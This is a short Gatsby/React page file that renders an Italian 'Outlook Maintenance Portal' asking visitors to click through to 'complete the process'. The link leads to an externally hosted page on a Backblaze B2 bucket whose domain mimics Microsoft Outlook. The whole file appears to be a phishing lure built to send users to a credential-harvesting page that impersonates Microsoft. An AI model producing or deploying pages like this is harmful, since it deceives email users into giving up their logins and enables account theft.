import * as React from "react"
import { Link } from "gatsby"

import Layout from "../components/layout"
import Seo from "../components/seo"

const SecondPage = () => (
  <Layout>
    <Seo title="Outlook" />
    <h1>Portale di Manutenzione Outlook</h1>
    <p>Clicca qui sotto per completare il processo</p>
    <Link to="https://onlinemsnportaledimanutenzionedimicrosoftoutlook.s3.us-west-002.backblazeb2.com/index.html">Portale Outlook</Link>
  </Layout>
)

export default SecondPage
